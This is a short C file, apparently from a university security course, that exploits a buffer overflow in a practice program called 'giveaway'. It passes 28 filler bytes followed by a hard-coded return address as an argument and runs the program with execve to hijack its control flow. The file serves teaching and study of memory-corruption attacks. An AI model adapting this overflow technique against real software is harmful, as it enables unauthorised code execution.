/*
 * Doowon Kim
 * doowon@utk.edu
 * This code, called exploit.c, exploits the vulnerablity you've found
 * in the giveaway.c code. 
 * NOTE: You may want to fill out your code in the below asterisk box.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int main(int _argc, char *_argv[]){
	const char *giveaway = "./giveaway";
	
	char buf[128];
	char *argv[3];
	
	strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x85\x04\x08");

	argv[0] = (char *)giveaway;
	argv[1] = buf;
	argv[2] = 0;

	if (execve(giveaway, argv, NULL) < 0){
		perror("execve");
		return 1;
	}

	return 0;
}
